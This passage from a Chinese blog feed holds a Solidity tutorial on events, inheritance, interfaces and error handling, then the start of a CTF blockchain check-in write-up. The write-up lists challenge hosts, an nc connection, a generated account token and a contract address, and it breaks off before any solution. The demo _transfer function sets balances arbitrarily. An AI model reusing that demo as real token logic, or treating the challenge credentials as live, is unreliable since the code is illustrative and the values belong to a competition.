class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event Transfer(address indexed from, address indexed to, uint256 value);</span><br></pre></td></tr></table></figure><p>我们可以看到，<code>Transfer</code>事件共记录了3个变量<code>from</code>，<code>to</code>和<code>value</code>，分别对应代币的转账地址，接收地址和转账数量。</p><p>同时<code>from</code>和<code>to</code>前面带着<code>indexed</code>关键字，每个<code>indexed</code>标记的变量可以理解为检索事件的索引“键”，在以太坊上单独作为一个<code>topic</code>进行存储和索引，程序可以轻松的筛选出特定转账地址和接收地址的转账事件。每个事件最多有3个带<code>indexed</code>的变量。每个 <code>indexed</code> 变量的大小为固定的256比特。事件的哈希以及这三个带<code>indexed</code>的变量在<code>EVM</code>日志中通常被存储为<code>topic</code>。其中<code>topic[0]</code>是此事件的<code>keccak256</code>哈希，<code>topic[1]</code>到<code>topic[3]</code>存储了带<code>indexed</code>变量的<code>keccak256</code>哈希。</p><p><code>value</code> 不带 <code>indexed</code> 关键字，会存储在事件的 <code>data</code> 部分中，可以理解为事件的“值”。<code>data</code> 部分的变量不能被直接检索，但可以存储任意大小的数据。因此一般 <code>data</code> 部分可以用来存储复杂的数据结构，例如数组和字符串等等，因为这些数据超过了256比特，即使存储在事件的 <code>topic</code> 部分中，也是以哈希的方式存储。另外，<code>data</code> 部分的变量在存储上消耗的gas相比于 <code>topic</code> 更少。</p><p>我们可以在函数里释放事件。在下面的例子中，每次用<code>_transfer()</code>函数进行转账操作的时候，都会释放<code>Transfer</code>事件，并记录相应的变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 定义_transfer函数，执行转账逻辑</span><br><span class="line">function _transfer(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) external &#123;</span><br><span class="line"></span><br><span class="line">    _balances[from] = 10000000; // 给转账地址一些初始代币</span><br><span class="line"></span><br><span class="line">    _balances[from] -=  amount; // from地址减去转账数量</span><br><span class="line">    _balances[to] += amount; // to地址加上转账数量</span><br><span class="line"></span><br><span class="line">    // 释放事件</span><br><span class="line">    emit Transfer(from, to, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="事件查询"><a href="#事件查询" class="headerlink" title="事件查询"></a>事件查询</h4><p>在<a href="https://rinkeby.etherscan.io/%E4%B8%AD%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E5%88%B0%E4%BA%A4%E6%98%93%E8%AE%B0%E5%BD%95%E5%92%8C%E7%82%B9%E5%87%BB%60Logs%60%E6%8C%89%E9%92%AE%EF%BC%8C%E5%B0%B1%E8%83%BD%E7%9C%8B%E5%88%B0%E4%BA%8B%E4%BB%B6%E6%98%8E%E7%BB%86%EF%BC%9A">https://rinkeby.etherscan.io/中可以查看到交易记录和点击`Logs`按钮，就能看到事件明细：</a></p><p><code>Topics</code>里面有三个元素，<code>[0]</code>是这个事件的哈希，<code>[1]</code>和<code>[2]</code>是我们定义的两个<code>indexed</code>变量的信息，即转账的转出地址和接收地址。<code>Data</code>里面是剩下的不带<code>indexed</code>的变量，也就是转账数量。</p><h3 id="继承inheritance"><a href="#继承inheritance" class="headerlink" title="继承inheritance"></a>继承inheritance</h3><p>承是面向对象编程很重要的组成部分，可以显著减少重复代码。如果把合约看作是对象的话，<code>solidity</code>也是面向对象的编程，也支持继承。</p><h4 id="继承规则"><a href="#继承规则" class="headerlink" title="继承规则"></a>继承规则</h4><ul><li><code>virtual</code>: 父合约中的函数，如果希望子合约重写，需要加上<code>virtual</code>关键字。</li><li><code>override</code>：子合约重写了父合约中的函数，需要加上<code>override</code>关键字。</li></ul><h4 id="简单继承"><a href="#简单继承" class="headerlink" title="简单继承"></a>简单继承</h4><p>先写一个简单的爷爷合约<code>Yeye</code>，里面包含1个<code>Log</code>事件和3个<code>function</code>: <code>hip()</code>, <code>pop()</code>, <code>yeye()</code>，输出都是”Yeye”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract Yeye &#123;</span><br><span class="line">    event Log(string msg);</span><br><span class="line"></span><br><span class="line">    // 定义3个function: hip(), pop(), man()，Log值为Yeye。</span><br><span class="line">    function hip() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function yeye() public virtual &#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再定义一个爸爸合约<code>Baba</code>，让他继承<code>Yeye</code>合约，语法就是<code>contract Baba is Yeye</code>，非常直观。在<code>Baba</code>合约里，我们重写一下<code>hip()</code>和<code>pop()</code>这两个函数，加上<code>override</code>关键字，并将他们的输出改为<code>”Baba”</code>；并且加一个新的函数<code>baba</code>，输出也是<code>”Baba”</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract Baba is Yeye&#123;</span><br><span class="line">    // 继承两个function: hip()和pop()，输出改为Baba。</span><br><span class="line">    function hip() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function baba() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署合约，可以看到<code>Baba</code>合约里有4个函数：<code>yeye()</code>、<code>baba()</code>、<code>hip()</code>和<code>pop()</code>，其中<code>hip()</code>和<code>pop()</code>的输出被成功改写成<code>”Baba”</code>，而继承来的<code>yeye()</code>的输出仍然是<code>”Yeye”</code>。</p><h4 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h4><p><code>solidity</code>的合约可以继承多个合约。规则：</p><p>继承时要按辈分最高到最低的顺序排。比如我们写一个<code>Erzi</code>合约，继承<code>Yeye</code>合约和<code>Baba</code>合约，那么就要写成<code>contract Erzi is Yeye, Baba</code>，而不能写成<code>contract Erzi is Baba, Yeye</code>，不然就会报错。 如果某一个函数在多个继承的合约里都存在，比如例子中的<code>hip()</code>和<code>pop()</code>，在子合约里必须重写，不然会报错。 重写在多个父合约中都重名的函数时，<code>override</code>关键字后面要加上所有父合约名字，例如<code>override(Yeye, Baba)</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract Erzi is Yeye, Baba&#123;</span><br><span class="line">    // 继承两个function: hip()和pop()，输出值为Erzi。</span><br><span class="line">    function hip() public virtual override(Yeye, Baba)&#123;</span><br><span class="line">        emit Log(&quot;Erzi&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override(Yeye, Baba) &#123;</span><br><span class="line">        emit Log(&quot;Erzi&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到，<code>Erzi</code>合约里面重写了<code>hip()</code>和<code>pop()</code>两个函数，将输出改为<code>”Erzi”</code>，并且还分别从<code>Yeye</code>和<code>Baba</code>合约继承了<code>yeye()</code>和<code>baba()</code>两个函数。</p><h4 id="修饰器的继承"><a href="#修饰器的继承" class="headerlink" title="修饰器的继承"></a>修饰器的继承</h4><p><code>Solidity</code>中的修饰器（<code>Modifier</code>）同样可以继承，用法与函数继承类似，在相应的地方加<code>virtual</code>和<code>override</code>关键字即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract Base1 &#123;</span><br><span class="line">    modifier exactDividedBy2And3(uint _a) virtual &#123;</span><br><span class="line">        require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Identifier is Base1 &#123;</span><br><span class="line"></span><br><span class="line">    //计算一个数分别被2除和被3除的值，但是传入的参数必须是2和3的倍数</span><br><span class="line">    function getExactDividedBy2And3(uint _dividend) public exactDividedBy2And3(_dividend) pure returns(uint, uint) &#123;</span><br><span class="line">        return getExactDividedBy2And3WithoutModifier(_dividend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //计算一个数分别被2除和被3除的值</span><br><span class="line">    function getExactDividedBy2And3WithoutModifier(uint _dividend) public pure returns(uint, uint)&#123;</span><br><span class="line">        uint div2 = _dividend / 2;</span><br><span class="line">        uint div3 = _dividend / 3;</span><br><span class="line">        return (div2, div3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Identifier</code>合约可以直接在代码中使用父合约中的<code>exactDividedBy2And3</code>修饰器，也可以利用<code>override</code>关键字重写修饰器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier exactDividedBy2And3(uint _a) override &#123;</span><br><span class="line">    _;</span><br><span class="line">    require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="构造函数的继承"><a href="#构造函数的继承" class="headerlink" title="构造函数的继承"></a>构造函数的继承</h4><p>子合约有两种方法继承父合约的构造函数。举个简单的例子，父合约<code>A</code>里面有一个状态变量<code>a</code>，并由构造函数的参数来确定：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 构造函数的继承</span><br><span class="line">abstract contract A &#123;</span><br><span class="line">    uint public a;</span><br><span class="line"></span><br><span class="line">    constructor(uint _a) &#123;</span><br><span class="line">        a = _a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>在继承时声明父构造函数的参数，例如：<code>contract B is A(1)</code></li><li>在子合约的构造函数中声明构造函数的参数，例如：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract C is A &#123;</span><br><span class="line">    constructor(uint _c) A(_c * _c) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="调用父合约的函数"><a href="#调用父合约的函数" class="headerlink" title="调用父合约的函数"></a>调用父合约的函数</h4><p>子合约有两种方式调用父合约的函数，直接调用和利用<code>super</code>关键字。</p><ul><li>直接调用：子合约可以直接用<code>父合约名.函数名()</code>的方式来调用父合约函数，例如<code>Yeye.pop()</code>。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function callParent() public&#123;</span><br><span class="line">    Yeye.pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>super</code>关键字：子合约可以利用<code>super.函数名()</code>来调用最近的父合约函数。<code>solidity</code>继承关系按声明时从右到左的顺序是：<code>contract Erzi is Yeye, Baba</code>，那么<code>Baba</code>是最近的父合约，<code>super.pop()</code>将调用<code>Baba.pop()</code>而不是<code>Yeye.pop()</code>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function callParentSuper() public&#123;</span><br><span class="line">    // 将调用最近的父合约函数，Baba.pop()</span><br><span class="line">    super.pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="抽象abstract"><a href="#抽象abstract" class="headerlink" title="抽象abstract"></a>抽象abstract</h3><p>如果一个智能合约里至少有一个未实现的函数，即某个函数缺少主体<code>&#123;&#125;</code>中的内容，则必须将该合约标为<code>abstract</code>，不然编译会报错；另外，未实现的函数需要加<code>virtual</code>，以便子合约重写。如果我们还没想好具体怎么实现函数，那么可以把合约标为<code>abstract</code>，之后让别人补写上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abstract contract InsertionSort&#123;</span><br><span class="line">    function insertionSort(uint[] memory a) public pure virtual returns(uint[] memory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接口interface"><a href="#接口interface" class="headerlink" title="接口interface"></a>接口interface</h3><p>接口类似于抽象合约，但它不实现任何功能。</p><h4 id="接口的规则"><a href="#接口的规则" class="headerlink" title="接口的规则"></a>接口的规则</h4><ol><li>不能包含状态变量</li><li>不能包含构造函数</li><li>不能继承除接口外的其他合约</li><li>所有函数都必须是external且不能有函数体</li><li>继承接口的合约必须实现接口定义的所有功能</li></ol><p>虽然接口不实现任何功能，但它非常重要。接口是智能合约的骨架，定义了合约的功能以及如何触发它们：如果智能合约实现了某种接口（比如<code>ERC20</code>或<code>ERC721</code>），其他Dapps和智能合约就知道如何与它交互。因为接口提供了两个重要的信息：</p><ol><li>合约里每个函数的<code>bytes4</code>选择器，以及基于它们的函数签名<code>函数名(每个参数类型）</code>。</li><li>接口id（更多信息见<a href="https://eips.ethereum.org/EIPS/eip-165">EIP165</a>）</li></ol><p>另外，接口与合约<code>ABI</code>（Application Binary Interface）等价，可以相互转换：编译接口可以得到合约的<code>ABI</code>，利用<a href="https://gnidan.github.io/abi-to-sol/">abi-to-sol工具</a>也可以将<code>ABI json</code>文件转换为<code>接口sol</code>文件。</p><h4 id="ERC721接口"><a href="#ERC721接口" class="headerlink" title="ERC721接口"></a>ERC721接口</h4><p>我们以<code>ERC721</code>接口合约<code>IERC721</code>为例，它定义了3个<code>event</code>和9个<code>function</code>，所有<code>ERC721</code>标准的NFT都实现了这些函数。我们可以看到，接口和常规合约的区别在于每个函数都以<code>;</code>代替函数体<code>&#123; &#125;</code>结尾。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">interface IERC721 is IERC165 &#123;</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);</span><br><span class="line">    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);</span><br><span class="line">    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);</span><br><span class="line">    </span><br><span class="line">    function balanceOf(address owner) external view returns (uint256 balance);</span><br><span class="line"></span><br><span class="line">    function ownerOf(uint256 tokenId) external view returns (address owner);</span><br><span class="line"></span><br><span class="line">    function safeTransferFrom(address from, address to, uint256 tokenId) external;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 tokenId) external;</span><br><span class="line"></span><br><span class="line">    function approve(address to, uint256 tokenId) external;</span><br><span class="line"></span><br><span class="line">    function getApproved(uint256 tokenId) external view returns (address operator);</span><br><span class="line"></span><br><span class="line">    function setApprovalForAll(address operator, bool _approved) external;</span><br><span class="line"></span><br><span class="line">    function isApprovedForAll(address owner, address operator) external view returns (bool);</span><br><span class="line"></span><br><span class="line">    function safeTransferFrom( address from, address to, uint256 tokenId, bytes calldata data) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="IERC721事件"><a href="#IERC721事件" class="headerlink" title="IERC721事件"></a>IERC721事件</h4><p><code>IERC721</code>包含3个事件，其中<code>Transfer</code>和<code>Approval</code>事件在<code>ERC20</code>中也有。</p><ul><li><code>Transfer</code>事件：在转账时被释放，记录代币的发出地址<code>from</code>，接收地址<code>to</code>和<code>tokenid</code>。</li><li><code>Approval</code>事件：在授权时释放，记录授权地址<code>owner</code>，被授权地址<code>approved</code>和<code>tokenid</code>。</li><li><code>ApprovalForAll</code>事件：在批量授权时释放，记录批量授权的发出地址<code>owner</code>，被授权地址<code>operator</code>和授权与否的<code>approved</code>。</li></ul><h4 id="IERC721函数"><a href="#IERC721函数" class="headerlink" title="IERC721函数"></a>IERC721函数</h4><ul><li><code>balanceOf</code>：返回某地址的NFT持有量<code>balance</code>。</li><li><code>ownerOf</code>：返回某<code>tokenId</code>的主人<code>owner</code>。</li><li><code>transferFrom</code>：普通转账，参数为转出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>safeTransferFrom</code>：安全转账（如果接收方是合约地址，会要求实现<code>ERC721Receiver</code>接口）。参数为转出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>approve</code>：授权另一个地址使用你的NFT。参数为被授权地址<code>approve</code>和<code>tokenId</code>。</li><li><code>getApproved</code>：查询<code>tokenId</code>被批准给了哪个地址。</li><li><code>setApprovalForAll</code>：将自己持有的该系列NFT批量授权给某个地址<code>operator</code>。</li><li><code>isApprovedForAll</code>：查询某地址的NFT是否批量授权给了另一个<code>operator</code>地址。</li><li><code>safeTransferFrom</code>：安全转账的重载函数，参数里面包含了<code>data</code>。</li></ul><h4 id="何时使用"><a href="#何时使用" class="headerlink" title="何时使用"></a>何时使用</h4><p>如果我们知道一个合约实现了<code>IERC721</code>接口，我们不需要知道它具体代码实现，就可以与它交互。</p><p>无聊猿<code>BAYC</code>属于<code>ERC721</code>代币，实现了<code>IERC721</code>接口的功能。我们不需要知道它的源代码，只需知道它的合约地址，用<code>IERC721</code>接口就可以与它交互，比如用<code>balanceOf()</code>来查询某个地址的<code>BAYC</code>余额，用<code>safeTransferFrom()</code>来转账<code>BAYC</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract interactBAYC &#123;</span><br><span class="line">    // 利用BAYC地址创建接口合约变量（ETH主网）</span><br><span class="line">    IERC721 BAYC = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);</span><br><span class="line"></span><br><span class="line">    // 通过接口调用BAYC的balanceOf()查询持仓量</span><br><span class="line">    function balanceOfBAYC(address owner) external view returns (uint256 balance)&#123;</span><br><span class="line">        return BAYC.balanceOf(owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 通过接口调用BAYC的safeTransferFrom()安全转账</span><br><span class="line">    function safeTransferFromBAYC(address from, address to, uint256 tokenId) external&#123;</span><br><span class="line">        BAYC.safeTransferFrom(from, to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><p><code>solidity</code>三种抛出异常的方法：<code>error</code>，<code>require</code>和<code>assert</code>，并比较三种方法的<code>gas</code>消耗。</p><h4 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h4><p><code>error</code>是<code>solidity 0.8版本</code>新加的内容，方便且高效（省<code>gas</code>）地向用户解释操作失败的原因。人们可以在<code>contract</code>之外定义异常。下面，我们定义一个<code>TransferNotOwner</code>异常，当用户不是代币<code>owner</code>的时候尝试转账，会抛出错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error TransferNotOwner(); // 自定义error</span><br></pre></td></tr></table></figure><p>在执行当中，<code>error</code>必须搭配<code>revert</code>（回退）命令使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function transferOwner1(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">    if(_owners[tokenId] != msg.sender)&#123;</span><br><span class="line">        revert TransferNotOwner();</span><br><span class="line">    &#125;</span><br><span class="line">    _owners[tokenId] = newOwner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们定义了一个<code>transferOwner1()</code>函数，它会检查代币的<code>owner</code>是不是发起人，如果不是，就会抛出<code>TransferNotOwner</code>异常；如果是的话，就会转账。</p><h4 id="Require"><a href="#Require" class="headerlink" title="Require"></a>Require</h4><p><code>require</code>命令是<code>solidity 0.8版本</code>之前抛出异常的常用方法，目前很多主流合约仍然还在使用它。它很好用，唯一的缺点就是<code>gas</code>随着描述异常的字符串长度增加，比<code>error</code>命令要高。使用方法：<code>require(检查条件，&quot;异常的描述&quot;)</code>，当检查条件不成立的时候，就会抛出异常。</p><p>我们用<code>require</code>命令重写一下上面的<code>transferOwner</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function transferOwner2(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">    require(_owners[tokenId] == msg.sender, &quot;Transfer Not Owner&quot;);</span><br><span class="line">    _owners[tokenId] = newOwner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Assert"><a href="#Assert" class="headerlink" title="Assert"></a>Assert</h4><p><code>assert</code>命令一般用于程序员写程序<code>debug</code>，因为它不能解释抛出异常的原因（比<code>require</code>少个字符串）。它的用法很简单，<code>assert(检查条件）</code>，当检查条件不成立的时候，就会抛出异常。</p><p>我们用<code>assert</code>命令重写一下上面的<code>transferOwner</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function transferOwner3(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">    assert(_owners[tokenId] == msg.sender);</span><br><span class="line">    _owners[tokenId] = newOwner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> Blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一个Blockchain签到题目</title>
      <link href="/article/2023-01-07-%E8%AE%B0%E4%B8%80%E4%B8%AABlockchain%E7%AD%BE%E5%88%B0%E9%A2%98%E7%9B%AE/"/>
      <url>/article/2023-01-07-%E8%AE%B0%E4%B8%80%E4%B8%AABlockchain%E7%AD%BE%E5%88%B0%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="Blockchain签到"><a href="#Blockchain签到" class="headerlink" title="Blockchain签到"></a>Blockchain签到</h2><h3 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一般题目中给出了三个端口，分别是 RPC、水龙头、题目交互端。</span><br><span class="line">其中，浏览器可直接访问的是水龙头，浏览器直接访问报 403 的是 RPC，浏览器无法访问的是题目交互端，需使用 nc 连接。</span><br><span class="line">week-1.hgame.lwsec.cn:30111</span><br><span class="line">week-1.hgame.lwsec.cn:32559</span><br><span class="line">week-1.hgame.lwsec.cn:32428</span><br></pre></td></tr></table></figure><h4 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h4><p>通过判断可以知道题目、RPC、水龙头分别对应的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">week-1.hgame.lwsec.cn:32559水龙头</span><br></pre></td></tr></table></figure><p>水龙头访问结果：</p><p><img src="/image/media/2022/Solidity/img2/1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">week-1.hgame.lwsec.cn:30111题目环境</span><br><span class="line">nc week-1.hgame.lwsec.cn 30111</span><br></pre></td></tr></table></figure><p>题目环境访问结果</p><p><img src="/image/media/2022/Solidity/img2/2.png"></p><p>题目环境有四个选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">We design a pretty easy contract challenge. Enjoy it!</span><br><span class="line">Your goal is to make isSolved() function returns true!</span><br><span class="line">[1] - Create an account which will be used to deploy the challenge contract</span><br><span class="line">[2] - Deploy the challenge contract using your generated account</span><br><span class="line">[3] - Get your flag once you meet the requirement</span><br><span class="line">[4] - Show the contract source code</span><br><span class="line">翻译：</span><br><span class="line">我们设计了一个非常简单的合同挑战。享受它！</span><br><span class="line">您的目标是使isSolved（）函数返回true！</span><br><span class="line">[1] -创建一个用于部署挑战合同的帐户</span><br><span class="line">[2] -使用生成的帐户部署挑战合同</span><br><span class="line">[3] -一旦满足要求，就拿旗</span><br><span class="line">[4] -显示合同源代码</span><br></pre></td></tr></table></figure><h5 id="创建账户"><a href="#创建账户" class="headerlink" title="创建账户"></a>创建账户</h5><p>首先选择1创建账户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[-] input your choice: 1</span><br><span class="line">[+] deployer account: 0x6FfB5cCb379A96b3aB7B1527372Ff90b4201f401</span><br><span class="line">[+] token: v4.local.JE3A5C-HZoI2joiVNAHV4NjBaxM7jyToGUKmx9CeCOSHxCLXEACw61gVdVYSAeL4zJeja0NyJkNFvxfwIYh04JYLFNkdLRimDi6mhC-_crrY4gZu1FkS0oyHu0fnIW_2NLdx3njjF4n51HQJXlEnwhizMBZLvtSf7yHRVNyftzOeqw</span><br><span class="line">[+] please transfer 0.001 test ether to the deployer account for next step</span><br></pre></td></tr></table></figure><p>可以看到拿到了一个账户和和一个token，并且我们需要转0.001 test ether到账户中</p><p>此时我们如果选择2会报错：</p><p><img src="/image/media/2022/Solidity/img2/3.png"></p><p>需要我们提前转账才能做后面的操作。</p><h5 id="测试币领取"><a href="#测试币领取" class="headerlink" title="测试币领取"></a>测试币领取</h5><p>可以使用水龙头进行测试币领取</p><p><img src="/image/media/2022/Solidity/img2/4.png"></p><h5 id="合约信息"><a href="#合约信息" class="headerlink" title="合约信息"></a>合约信息</h5><p>此时再选2</p><p><img src="/image/media/2022/Solidity/img2/5.png"></p><p>可以拿到远程合约的地址和交易的hash信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] contract address: 0xbdFcE62184338C494e4Ea6593c374c57C02279CB</span><br><span class="line">[+] transaction hash: 0xa1b89528e2954356c9cbb0088bceab1f72d151cf96b84e23ba71ecc8848d654c</span><br></pre></td></tr></table></figure><h5 id="查看合约源码"><a href="#查看合约源码" class="headerlink" 